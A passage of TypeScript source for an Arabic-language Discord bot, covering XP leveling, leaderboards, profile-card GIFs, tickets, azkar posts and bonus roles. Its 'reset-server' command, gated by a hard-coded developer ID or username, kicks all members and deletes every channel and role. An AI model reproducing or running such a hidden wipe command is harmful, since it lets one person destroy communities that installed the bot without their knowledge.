        const targetUser = interaction.options.getUser('user');
        const resetAll = interaction.options.getBoolean('all') || false;

        if (resetAll) {
          db.prepare("UPDATE leveling SET xb = 0 WHERE guildId = ?").run(guildId);
          await interaction.reply("✅ تم تصفير رصيد XB لجميع الأعضاء في السيرفر.");
        } else if (targetUser) {
          const targetRow = db.prepare("SELECT xb FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          const currentBalance = targetRow?.xb || 0;
          await deductXB(guildId, targetUser.id, currentBalance, `Admin reset by ${user.username}`);
          await interaction.reply(`✅ تم تصفير رصيد XB للعضو ${targetUser}.`);
        } else {
          await interaction.reply({ content: "❌ يرجى تحديد عضو أو اختيار تصفير الكل.", ephemeral: true });
        }
      }

      if (commandName === 'ping') {
        await interaction.reply(`Pong! Latency is ${client.ws.ping}ms.`);
      }

      if (commandName === 'ai') {
        const prompt = interaction.options.getString('prompt')!;
        await interaction.deferReply();
        return handleAIResponse(interaction, prompt);
      }

      if (commandName === 'u') {
        const targetUser = interaction.options.getUser('user') || user;
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
        const xp = userRow?.xp || 0;
        const level = userRow?.level || 0;
        
        const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId) as any[];
        const rank = leaderboard.findIndex(u => u.userId === targetUser.id) + 1;
        
        const embed = new EmbedBuilder()
          .setTitle(`📊 نشاط ${targetUser.username}`)
          .setThumbnail(targetUser.displayAvatarURL())
          .addFields(
            { name: "المستوى", value: level.toString(), inline: true },
            { name: "الخبرة (XP)", value: xp.toString(), inline: true },
            { name: "الترتيب", value: `#${rank}`, inline: true }
          )
          .setColor(0x00AE86);
        return interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'y') {
        const targetUser = interaction.options.getUser('user') || user;
        const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
        if (!targetMember) return interaction.reply({ content: "❌ المستخدم غير موجود.", ephemeral: true });
        
        const joinedAt = targetMember.joinedAt;
        const embed = new EmbedBuilder()
          .setTitle(`📅 تاريخ الانضمام`)
          .setDescription(`${targetUser} انضم إلى السيرفر في:\n**${joinedAt?.toLocaleDateString('ar-EG', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}**`)
          .setColor(0x5865F2);
        return interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'rank') {
        const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId) as any;
        if (!userRow) return interaction.reply({ content: "You don't have a rank yet. Start chatting!", ephemeral: true });

        const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId) as any[];
        const dynamicRewardMap = new Map(dynamicRewards.map(r => [r.level, r.roleId]));
        const allRewardLevels = Array.from(new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()]));
        
        const nextRewardLevel = allRewardLevels
          .filter(lvl => lvl > userRow.level)
          .sort((a, b) => a - b)[0];

        const embed = new EmbedBuilder()
          .setTitle(`${user.username}'s Rank`)
          .addFields(
            { name: "Level", value: userRow.level.toString(), inline: true },
            { name: "XP", value: `${userRow.xp} / ${(userRow.level + 1) * 300}`, inline: true },
            { name: "Bonus", value: (userRow.bonus || 0).toString(), inline: true }
          )
          .setColor(0x00AE86);

        if (nextRewardLevel) {
          const roleId = dynamicRewardMap.get(nextRewardLevel) || LEVEL_ROLES[nextRewardLevel];
          embed.addFields({ name: "Next Reward", value: `Level **${nextRewardLevel}**: <@&${roleId}>`, inline: false });
        }
        
        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'top') {
        const role = interaction.options.getRole('role');
        const limit = interaction.options.getInteger('limit') || 10;
        const timeframe = interaction.options.getString('timeframe');
        const type = interaction.options.getString('type');

        let query = "";
        let params: any[] = [guildId];
        let title = "Global Leaderboard";
        let isTimeBased = false;

        if (timeframe === 'day') {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-1 day')";
          title = "Daily Leaderboard";
          isTimeBased = true;
        } else if (timeframe === 'week') {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-7 days')";
          title = "Weekly Leaderboard";
          isTimeBased = true;
        } else if (timeframe === 'month') {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-30 days')";
          title = "Monthly Leaderboard";
          isTimeBased = true;
        } else if (timeframe === 'year') {
          query = "SELECT userId, SUM(xp) as totalXp FROM xp_history WHERE guildId = ? AND timestamp >= datetime('now', '-365 days')";
          title = "Yearly Leaderboard";
          isTimeBased = true;
        } else {
          query = "SELECT userId, xp as totalXp, level FROM leveling WHERE guildId = ?";
          title = "All-Time Leaderboard";
        }

        if (isTimeBased) {
          if (type === 'voice') {
            query += " AND type = 'voice'";
            title += " (Voice)";
          } else if (type === 'text') {
            query += " AND type = 'text'";
            title += " (Text)";
          }
          query += " GROUP BY userId ORDER BY totalXp DESC";
        } else {
          query += " ORDER BY level DESC, xp DESC";
        }

        let leaderboard = db.prepare(query).all(...params) as any[];

        if (role) {
          const roleMemberIds = (role as any).members.map((m: any) => m.id);
          leaderboard = leaderboard.filter(u => roleMemberIds.includes(u.userId));
        }

        const topUsers = leaderboard.slice(0, Math.min(Math.max(limit, 1), 25));
        
        const embed = new EmbedBuilder()
          .setTitle(role ? `Leaderboard for ${role.name} (${title})` : `${title} (Top ${topUsers.length})`)
          .setColor(0x5865F2)
          .setTimestamp();

        if (topUsers.length === 0) {
          embed.setDescription("No users found in the leaderboard.");
        } else {
          const list = topUsers.map((u, index) => {
            const levelStr = u.level !== undefined ? ` - Level ${u.level}` : "";
            return `**#${index + 1}** | <@${u.userId}>${levelStr} (${u.totalXp} XP)`;
          }).join("\n");
          embed.setDescription(list);
        }

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'id') {
        const targetUser = interaction.options.getUser('user') || user;
        const targetMember = await guild.members.fetch(targetUser.id).catch(() => null);
        
        if (!targetMember) {
          return interaction.reply({ content: "❌ هذا المستخدم غير موجود في السيرفر.", ephemeral: true });
        }

        await interaction.deferReply();

        try {
          const userRow = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(targetUser.id, guildId) as any;
          const level = userRow?.level || 0;
          const xp = userRow?.xp || 0;
          const nextLevelXp = (level + 1) * 300;
          
          const leaderboard = db.prepare("SELECT userId FROM leveling WHERE guildId = ? ORDER BY level DESC, xp DESC").all(guildId) as any[];
          const rank = leaderboard.findIndex(u => u.userId === targetUser.id) + 1;

          const width = 800;
          const height = 300;
          const canvas = createCanvas(width, height);
          const ctx = canvas.getContext('2d');

          const avatarURL = targetUser.displayAvatarURL({ extension: 'png', size: 256 });
          const avatar = await loadImage(avatarURL);

          const encoder = new GIFEncoder(width, height);
          encoder.start();
          encoder.setRepeat(0);
          encoder.setDelay(50);
          encoder.setQuality(10);

          const totalFrames = 20;
          const targetProgress = Math.min(xp / nextLevelXp, 1);

          for (let i = 0; i <= totalFrames; i++) {
            const currentProgress = (i / totalFrames) * targetProgress;
            ctx.clearRect(0, 0, width, height);
            const bgGradient = ctx.createLinearGradient(0, 0, width, height);
            bgGradient.addColorStop(0, '#1a1a2e');
            bgGradient.addColorStop(1, '#16213e');
            ctx.fillStyle = bgGradient;
            ctx.fillRect(0, 0, width, height);
            ctx.save();
            ctx.globalAlpha = 0.1;
            ctx.fillStyle = '#5865f2';
            ctx.beginPath();
            ctx.arc(width, 0, 200, 0, Math.PI * 2);
            ctx.fill();
            ctx.beginPath();
            ctx.arc(0, height, 150, 0, Math.PI * 2);
            ctx.fill();
            ctx.restore();
            ctx.save();
            ctx.fillStyle = 'rgba(255, 255, 255, 0.05)';
            ctx.beginPath();
            ctx.roundRect(30, 30, width - 60, height - 60, 25);
            ctx.fill();
            ctx.strokeStyle = 'rgba(255, 255, 255, 0.1)';
            ctx.lineWidth = 1;
            ctx.stroke();
            ctx.restore();
            ctx.save();
            ctx.shadowBlur = 20;
            ctx.shadowColor = '#5865f2';
            ctx.beginPath();
            ctx.arc(130, 150, 80, 0, Math.PI * 2);
            ctx.fillStyle = '#5865f2';
            ctx.globalAlpha = 0.2;
            ctx.fill();
            ctx.restore();
            ctx.save();
            ctx.beginPath();
            ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.clip();
            ctx.drawImage(avatar, 55, 75, 150, 150);
            ctx.restore();
            ctx.strokeStyle = '#5865f2';
            ctx.lineWidth = 4;
            ctx.beginPath();
            ctx.arc(130, 150, 75, 0, Math.PI * 2, true);
            ctx.stroke();
            ctx.font = 'bold 38px sans-serif';
            ctx.fillStyle = '#ffffff';
            ctx.textAlign = 'left';
            ctx.fillText(targetUser.username, 240, 95);
            const drawStat = (x: number, y: number, label: string, value: string, color: string) => {
              ctx.font = '14px sans-serif';
              ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
              ctx.fillText(label, x, y);
              ctx.font = 'bold 24px sans-serif';
              ctx.fillStyle = color;
              ctx.fillText(value, x, y + 30);
            };
            drawStat(240, 130, "LEVEL", level.toString(), "#5865f2");
            drawStat(360, 130, "RANK", `#${rank}`, "#00d2ff");
            drawStat(480, 130, "PROGRESS", `${Math.floor(currentProgress * 100)}%`, "#ff007a");
            const barWidth = 500;
            const barHeight = 30;
            const barX = 240;
            const barY = 195;
            ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
            ctx.beginPath();
            ctx.roundRect(barX, barY, barWidth, barHeight, 15);
            ctx.fill();
            if (currentProgress > 0) {
              const barGrad = ctx.createLinearGradient(barX, 0, barX + barWidth, 0);
              barGrad.addColorStop(0, '#5865f2');
              barGrad.addColorStop(1, '#ff007a');
              ctx.fillStyle = barGrad;
              ctx.beginPath();
              ctx.roundRect(barX, barY, barWidth * currentProgress, barHeight, 15);
              ctx.fill();
            }
            ctx.font = 'bold 14px sans-serif';
            ctx.fillStyle = '#ffffff';
            ctx.textAlign = 'center';
            ctx.fillText(`${xp} / ${nextLevelXp} XP`, barX + barWidth / 2, barY + 20);
            encoder.addFrame(ctx);
          }
          for (let i = 0; i < 15; i++) encoder.addFrame(ctx);
          encoder.finish();
          const buffer = encoder.out.getData();
          const attachment = new AttachmentBuilder(buffer, { name: 'profile-card.gif' });
          await interaction.editReply({ files: [attachment] });
        } catch (err) {
          console.error("Error generating ID image:", err);
          await interaction.editReply("حدث خطأ أثناء إنشاء صورة الهوية المتحركة.");
        }
      }

      if (commandName === 'bonus') {
        const userRow = db.prepare("SELECT bonus FROM leveling WHERE userId = ? AND guildId = ?").get(user.id, guildId) as any;
        const currentBonus = userRow?.bonus || 0;

        const currentHour = new Date().getHours();
        const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
        const isBonusChannel = BONUS_CHANNELS.includes(channel?.id || "");

        let multiplier = 1;
        if (isHappyHour) multiplier *= 2;
        if (isBonusChannel) multiplier *= 2;

        const embed = new EmbedBuilder()
          .setTitle("نظام الـ Bonus و XP")
          .setDescription(`رصيدك الحالي من الـ **Bonus**: \`${currentBonus}\``)
          .addFields(
            { name: "Happy Hour", value: isHappyHour ? "✅ Active (2x XP)" : "❌ Inactive (6 PM - 8 PM)", inline: true },
            { name: "Channel Bonus", value: isBonusChannel ? "✅ Active (2x XP)" : "❌ Inactive in this channel", inline: true },
            { name: "Total Multiplier", value: `${multiplier}x`, inline: false }
          )
          .setFooter({ text: "تحصل على ترقية تلقائية عند وصولك لـ 20 bonus" })
          .setColor(multiplier > 1 ? 0x00FF00 : 0x5865F2);

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'rewards') {
        const embed = new EmbedBuilder()
          .setTitle("Level Role Rewards")
          .setDescription("Reach these levels to unlock exclusive roles!")
          .setColor(0x5865F2);

        const dynamicRewards = db.prepare("SELECT level, roleId FROM rewards WHERE guildId = ?").all(guildId) as any[];
        const dynamicRewardMap = new Map(dynamicRewards.map(r => [r.level, r.roleId]));
        const allLevels = Array.from(new Set([...Object.keys(LEVEL_ROLES).map(Number), ...dynamicRewardMap.keys()])).sort((a, b) => a - b);

        const rewardList = allLevels
          .map(lvl => {
            const roleId = dynamicRewardMap.get(lvl) || LEVEL_ROLES[lvl];
            return `Level **${lvl}**: <@&${roleId}>`;
          })
          .join("\n") || "No rewards configured yet.";

        embed.addFields({ name: "Available Rewards", value: rewardList });
        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'nick') {
        const targetMember = interaction.options.getMember('user') as any || interaction.member;
        const newNick = interaction.options.getString('name');

        if (targetMember.id !== user.id && !interaction.memberPermissions?.has(PermissionFlagsBits.ManageNicknames)) {
          return interaction.reply({ content: "❌ ليس لديك صلاحية تغيير أسماء الآخرين.", ephemeral: true });
        }

        if (!guild.members.me?.permissions.has(PermissionFlagsBits.ManageNicknames)) {
          return interaction.reply({ content: "❌ البوت لا يملك صلاحية تغيير الأسماء.", ephemeral: true });
        }

        if (targetMember.id !== guild.ownerId && targetMember.roles.highest.position >= guild.members.me.roles.highest.position) {
          return interaction.reply({ content: "❌ لا يمكنني تغيير اسم هذا الشخص بسبب الرتب.", ephemeral: true });
        }

        try {
          await targetMember.setNickname(newNick);
          await interaction.reply({ content: newNick ? `✅ تم تغيير اسم ${targetMember.user.username} إلى **${newNick}**` : `✅ تم إزالة الاسم المستعار لـ ${targetMember.user.username}` });
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "❌ حدث خطأ أثناء محاولة تغيير الاسم.", ephemeral: true });
        }
      }

      if (commandName === 'clear') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.ManageMessages)) {
          return interaction.reply({ content: "You need 'Manage Messages' permission.", ephemeral: true });
        }
        
        if (!guild.members.me?.permissions.has(PermissionFlagsBits.ManageMessages)) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية حذف الرسائل (Manage Messages).", ephemeral: true });
        }

        const amount = interaction.options.getInteger('amount')!;
        if (amount < 1 || amount > 100) return interaction.reply({ content: "Please provide a number between 1 and 100.", ephemeral: true });

        try {
          const deleted = await (channel as any).bulkDelete(amount, true);
          await interaction.reply({ content: `✅ Deleted ${deleted.size} messages.`, ephemeral: true });
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "Failed to clear messages.", ephemeral: true });
        }
      }

      if (commandName === 'setup-ticket') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "You need Administrator permissions.", ephemeral: true });
        }

        const role = interaction.options.getRole('role')!;
        db.prepare("INSERT INTO ticket_settings (guildId, supportRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET supportRoleId = excluded.supportRoleId").run(guild.id, role.id);

        const embed = new EmbedBuilder()
          .setTitle("Support Tickets")
          .setDescription("Click the button below to open a support ticket.")
          .setColor(0x5865F2);

        const button = new ButtonBuilder()
          .setCustomId("open_ticket")
          .setLabel("Open Ticket")
          .setStyle(ButtonStyle.Primary)
          .setEmoji("🎫");

        const row = new ActionRowBuilder<ButtonBuilder>().addComponents(button);
        
        const botMember = guild.members.me;
        if (!botMember?.permissionsIn(interaction.channelId!).has([PermissionFlagsBits.SendMessages, PermissionFlagsBits.EmbedLinks])) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى صلاحية إرسال الرسائل أو الروابط في هذا الروم.", ephemeral: true });
        }

        await interaction.channel?.send({ embeds: [embed], components: [row] });
        await interaction.reply({ content: `Ticket setup sent! Support role set to ${role}.`, ephemeral: true });
      }

      if (commandName === 'reset-server') {
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (user.id !== authorizedId && user.username !== authorizedUsername) return interaction.reply({ content: "❌ هذا الأمر خاص بالمطور فقط.", ephemeral: true });
        
        const botMember = guild.members.me;
        if (!botMember?.permissions.has([PermissionFlagsBits.KickMembers, PermissionFlagsBits.ManageChannels, PermissionFlagsBits.ManageRoles])) {
          return interaction.reply({ content: "❌ البوت يفتقر إلى الصلاحيات اللازمة (طرد الأعضاء، إدارة القنوات، إدارة الرتب).", ephemeral: true });
        }

        await interaction.deferReply();
        await interaction.editReply("⚠️ جاري البدء في إعادة تعيين السيرفر (حذف الأعضاء، الرومات، والرتب)...");
        
        // 1. Kick Members (except owner, bot, and users with Owner role)
        try {
          const members = await guild.members.fetch().catch(() => guild.members.cache);
          console.log(`[RESET] Kicking ${members.size} members...`);
          for (const member of members.values()) {
            const memberIsOwner = member.id === guild.ownerId || member.roles.cache.some(r => r.name.toLowerCase() === 'owner');
            if (!memberIsOwner && member.id !== client.user?.id && member.kickable) {
              member.kick("Server Reset").catch(err => {
                if (err.code === 50013) console.warn(`[RESET] Missing Permissions to kick ${member.user.tag}`);
                else console.error(`Failed to kick ${member.user.tag}:`, err.message);
              });
            }
          }
        } catch (err) { console.error("Error fetching members for reset:", err); }

        // 2. Delete Channels
        try {
          const channels = await guild.channels.fetch();
          console.log(`[RESET] Deleting ${channels.size} channels...`);
          for (const ch of channels.values()) {
            if (ch && ch.deletable) {
              ch.delete("Server Reset").catch(err => {
                if (err.code === 50013) console.warn(`[RESET] Missing Permissions to delete channel ${ch.name}`);
                else console.error(`Failed to delete channel ${ch.name}:`, err.message);
              });
            }
          }
        } catch (err) { console.error("Error fetching channels for reset:", err); }

        // 3. Delete Roles (except @everyone and bot roles)
        try {
          const roles = await guild.roles.fetch();
          console.log(`[RESET] Deleting ${roles.size} roles...`);
          for (const role of roles.values()) {
            // Skip @everyone, bot roles, and roles higher than bot's highest role
            if (role.name !== "@everyone" && !role.managed && role.editable && role.id !== guild.id) {
              role.delete("Server Reset").catch(err => {
                if (err.code === 50013) console.warn(`[RESET] Missing Permissions to delete role ${role.name}`);
                else console.error(`Failed to delete role ${role.name}:`, err.message);
              });
            }
          }
        } catch (err) { console.error("Error fetching roles for reset:", err); }

        // 4. Create a fresh start channel
        setTimeout(async () => {
          try {
            if (botMember?.permissions.has(PermissionFlagsBits.ManageChannels)) {
              const newChannel = await guild.channels.create({ 
                name: "welcome", 
                type: ChannelType.GuildText,
                topic: "Server has been reset."
              });
              await newChannel.send("✅ تم تصفير السيرفر بنجاح (حذف الأعضاء، الرومات، والرتب).");
            }
          } catch (e) { console.error("Failed to create welcome channel after reset:", e); }
        }, 8000);
      }

      if (commandName === 'setxp') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const target = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;
        const level = Math.floor(amount / 300);
        db.prepare("INSERT OR REPLACE INTO leveling (userId, guildId, xp, level) VALUES (?, ?, ?, ?)").run(target.id, guildId, amount, level);
        await interaction.reply(`✅ Set ${target}'s XP to **${amount}** (Level ${level}) in this server.`);
      }

      if (commandName === 'set-reward') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const level = interaction.options.getInteger('level')!;
        const role = interaction.options.getRole('role')!;
        db.prepare("INSERT OR REPLACE INTO rewards (guildId, level, roleId) VALUES (?, ?, ?)").run(guildId, level, role.id);
        await interaction.reply(`✅ Reward set: Level **${level}** -> <@&${role.id}>`);
      }

      if (commandName === 'set-prefix') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const newPrefix = interaction.options.getString('prefix')!;
        db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run(`prefix_${guildId}`, newPrefix);
        await interaction.reply(`✅ Prefix updated to: \`${newPrefix}\``);
      }

      if (commandName === 'set-level') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const ch = interaction.options.getChannel('channel');
        const message = interaction.options.getString('message');
        const status = interaction.options.getString('status');

        if (ch) {
          if (ch.type !== ChannelType.GuildText) return interaction.reply({ content: "Must be a text channel.", ephemeral: true });
          db.prepare("INSERT INTO leveling_settings (guildId, channelId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId").run(guildId, ch.id);
        }
        if (message) {
          db.prepare("INSERT INTO leveling_settings (guildId, message) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET message = excluded.message").run(guildId, message);
        }
        if (status) {
          const enabled = status === 'on' ? 1 : 0;
          db.prepare("INSERT INTO leveling_settings (guildId, enabled) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET enabled = excluded.enabled").run(guildId, enabled);
        }

        await interaction.reply(`✅ تم تحديث إعدادات اللفل بنجاح.`);
      }

      if (commandName === 'azkar-setup') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const channel = interaction.options.getChannel('channel') as TextChannel;
        const interval = interaction.options.getInteger('interval')!;
        const status = interaction.options.getString('status')!;
        const enabled = status === 'on' ? 1 : 0;

        if (channel.type !== ChannelType.GuildText) {
          return interaction.reply({ content: "يجب اختيار قناة نصية.", ephemeral: true });
        }

        db.prepare("INSERT INTO azkar_settings (guildId, channelId, interval, enabled) VALUES (?, ?, ?, ?) ON CONFLICT(guildId) DO UPDATE SET channelId = excluded.channelId, interval = excluded.interval, enabled = excluded.enabled").run(guildId, channel.id, interval, enabled);

        await interaction.reply(`✅ تم إعداد نظام الأذكار بنجاح!\nالقناة: ${channel}\nالمدة: كل ${interval} دقيقة\nالحالة: ${status === 'on' ? 'مفعل' : 'معطل'}`);
      }

      if (commandName === 'azkar-add') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const content = interaction.options.getString('content')!;
        db.prepare("INSERT INTO custom_azkar (guildId, content) VALUES (?, ?)").run(guildId, content);
        await interaction.reply(`✅ تم إضافة الذكر بنجاح: **${content}**`);
      }

      if (commandName === 'azkar-list') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const customAzkar = db.prepare("SELECT * FROM custom_azkar WHERE guildId = ?").all(guildId) as any[];
        if (customAzkar.length === 0) {
          return interaction.reply({ content: "لا توجد أذكار مخصصة حالياً.", ephemeral: true });
        }
        const list = customAzkar.map(a => `**#${a.id}**: ${a.content}`).join("\n");
        const embed = new EmbedBuilder()
          .setTitle("📜 قائمة الأذكار المخصصة")
          .setDescription(list)
          .setColor(0x5865F2);
        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'azkar-remove') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const id = interaction.options.getInteger('id')!;
        const result = db.prepare("DELETE FROM custom_azkar WHERE id = ? AND guildId = ?").run(id, guildId);
        if (result.changes > 0) {
          await interaction.reply(`✅ تم حذف الذكر رقم **#${id}** بنجاح.`);
        } else {
          await interaction.reply({ content: "❌ لم يتم العثور على ذكر بهذا الرقم.", ephemeral: true });
        }
      }

      if (commandName === 'add-bonus') {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member as any;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ عذراً، هذا الأمر مخصص لأصحاب الرتبة المحددة فقط.", ephemeral: true });
        }

        const target = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;

        if (amount <= 0) return interaction.reply({ content: "❌ يجب أن تكون الكمية أكبر من صفر.", ephemeral: true });

        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = bonus + ?").run(target.id, guildId, amount, amount);
        
        await interaction.reply(`✅ تم إضافة **${amount}** بونيس لـ ${target}.`);
        
        // Check for role upgrade
        await checkBonusRoles(guildId, target.id);
      }

      if (commandName === 'remove-bonus') {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member as any;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ عذراً، هذا الأمر مخصص لأصحاب الرتبة المحددة فقط.", ephemeral: true });
        }

        const target = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;

        if (amount <= 0) return interaction.reply({ content: "❌ يجب أن تكون الكمية أكبر من صفر.", ephemeral: true });

        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, 0) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = MAX(0, bonus - ?)").run(target.id, guildId, amount);
        
        await interaction.reply(`✅ تم سحب **${amount}** بونيس من ${target}.`);
        
        // Check for role downgrade/update
        await checkBonusRoles(guildId, target.id);
      }

      if (commandName === 'set-bonus') {
        const authorizedRole = "1484100584054325269";
        const member = interaction.member as any;
        if (!member.roles.cache.has(authorizedRole) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "❌ عذراً، هذا الأمر مخصص لأصحاب الرتبة المحددة فقط.", ephemeral: true });
        }

        const target = interaction.options.getUser('user')!;
        const amount = interaction.options.getInteger('amount')!;

        if (amount < 0) return interaction.reply({ content: "❌ يجب أن تكون الكمية صفر أو أكثر.", ephemeral: true });

        db.prepare("INSERT INTO leveling (userId, guildId, bonus) VALUES (?, ?, ?) ON CONFLICT(userId, guildId) DO UPDATE SET bonus = ?").run(target.id, guildId, amount, amount);
        
        await interaction.reply(`✅ تم تحديد بونيس ${target} بـ **${amount}**.`);
        
        // Check for role update
        await checkBonusRoles(guildId, target.id);
      }

      if (commandName === 'bonus-role-add') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole('role')!;

        db.prepare("INSERT OR REPLACE INTO bonus_roles (guildId, roleId) VALUES (?, ?)").run(guildId, role.id);
        await interaction.reply(`✅ تم إضافة الرتبة ${role} إلى نظام الترقية التلقائية بالبونيس.`);
      }

      if (commandName === 'bonus-role-remove') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const role = interaction.options.getRole('role')!;
        const result = db.prepare("DELETE FROM bonus_roles WHERE guildId = ? AND roleId = ?").run(guildId, role.id);

        if (result.changes > 0) {
          await interaction.reply(`✅ تم إزالة الرتبة ${role} من قائمة الترقية التلقائية.`);
        } else {
          await interaction.reply({ content: "❌ هذه الرتبة ليست في قائمة الترقية التلقائية.", ephemeral: true });
        }
      }

      if (commandName === 'bonus-role-list') {
        const settings = db.prepare("SELECT maxRoleId, excludedRoleIds, baseRoleId FROM bonus_role_settings WHERE guildId = ?").get(guildId) as any;
        const excludedRoleIds = settings?.excludedRoleIds ? settings.excludedRoleIds.split(',').map((id: string) => id.trim()) : [];
        const maxRoleId = settings?.maxRoleId;
        const baseRoleId = settings?.baseRoleId;

        let systemRoles: any[] = [];

        if (baseRoleId && maxRoleId) {
          const baseRole = interaction.guild?.roles.cache.get(baseRoleId);
          const maxRole = interaction.guild?.roles.cache.get(maxRoleId);
          
          if (baseRole && maxRole) {
            systemRoles = interaction.guild!.roles.cache
              .filter(r => r.position > baseRole.position && r.position <= maxRole.position && !excludedRoleIds.includes(r.id))
              .sort((a, b) => a.position - b.position)
              .map(r => r);
          }
        }

        if (systemRoles.length === 0) {
          const roles = db.prepare("SELECT roleId FROM bonus_roles WHERE guildId = ?").all(guildId) as any[];
          systemRoles = roles
            .map(r => interaction.guild?.roles.cache.get(r.roleId))
            .filter(r => r !== undefined && !excludedRoleIds.includes(r.id))
            .sort((a, b) => a!.position - b!.position);
        }

        if (systemRoles.length === 0) {
          return interaction.reply({ content: "لا توجد رتب ترقية تلقائية مضافة حالياً.", ephemeral: true });
        }

        const list = systemRoles.map((r, i) => `${i + 1}. <@&${r!.id}>`).join("\n");
        const embed = new EmbedBuilder()
          .setTitle("🏆 نظام الترقية التلقائية (Bonus)")
          .setDescription(`يتم الترقية تلقائياً عند جمع **20 bonus**.\n\n**ترتيب الرتب:**\n${list}`)
          .setColor(0x00FF00);

        if (baseRoleId) {
          embed.addFields({ name: "الرتبة الأساسية المطلوبة", value: `<@&${baseRoleId}>`, inline: true });
        }
        if (maxRoleId) {
          embed.addFields({ name: "أعلى رتبة (السقف)", value: `<@&${maxRoleId}>`, inline: true });
        }

        if (excludedRoleIds.length > 0) {
          const excluded = excludedRoleIds.map((id: string) => `<@&${id}>`).join(', ');
          embed.addFields({ name: "الرتب المستبعدة (تخطي)", value: excluded });
        }

        await interaction.reply({ embeds: [embed] });
      }

      if (commandName === 'bonus-role-settings') {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const maxRole = interaction.options.getRole('max-role');
        const baseRole = interaction.options.getRole('base-role');
        const excludedRolesStr = interaction.options.getString('excluded-roles');

        if (maxRole) {
          db.prepare("INSERT INTO bonus_role_settings (guildId, maxRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET maxRoleId = excluded.maxRoleId").run(guildId, maxRole.id);
        }
        if (baseRole) {
          db.prepare("INSERT INTO bonus_role_settings (guildId, baseRoleId) VALUES (?, ?) ON CONFLICT(guildId) DO UPDATE SET baseRoleId = excluded.baseRoleId").run(guildId, baseRole.id);
        }
